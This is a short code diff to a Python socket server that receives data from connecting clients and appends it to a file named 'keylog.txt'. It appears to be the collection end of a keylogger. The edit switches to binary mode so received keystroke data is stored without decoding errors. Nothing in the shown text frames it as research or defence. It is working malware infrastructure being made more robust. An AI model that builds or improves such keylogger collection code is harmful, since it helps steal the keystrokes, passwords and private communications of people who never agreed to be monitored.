@@ -9,12 +9,12 @@ def start_server():
     while True:
         client_socket, addr = server_socket.accept()
         print(f"Connection from {addr}")
-        with open("keylog.txt", "a") as log_file:
+        with open("keylog.txt", "ab") as log_file:  # Open the file in binary append mode
             while True:
                 data = client_socket.recv(1024)
                 if not data:
                     break
-                log_file.write(data.decode("utf-8"))
+                log_file.write(data)  # Write binary data directly
         client_socket.close()
 
 if __name__ == "__main__":
